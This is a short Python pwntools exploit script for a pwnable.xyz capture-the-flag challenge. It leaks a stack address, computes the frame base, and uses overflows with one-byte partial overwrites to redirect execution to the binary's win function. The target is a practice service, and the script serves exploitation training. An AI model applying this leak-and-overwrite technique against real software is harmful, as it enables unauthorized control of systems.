#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30012)
elf = ELF("./challenge")
win = elf.symbols['win']

# stack leak
p.sendlineafter("> ", '3')
environ = int(p.recvline(), 16)
log.info("environ : "+hex(environ))
rbp = environ - 248

# [rbp-0x11] -> [rbp - 0x8] : 9 offset
p.sendafter("> ", 'A'*0x20 + p8((rbp&0xff) + 9))
# v6 -> win
p.sendafter("> ", str(win&0xff))
p.sendafter("> ", 'A'*0x20 + p8(rbp&0xff))
p.sendafter("> ", '1')

p.interactive()
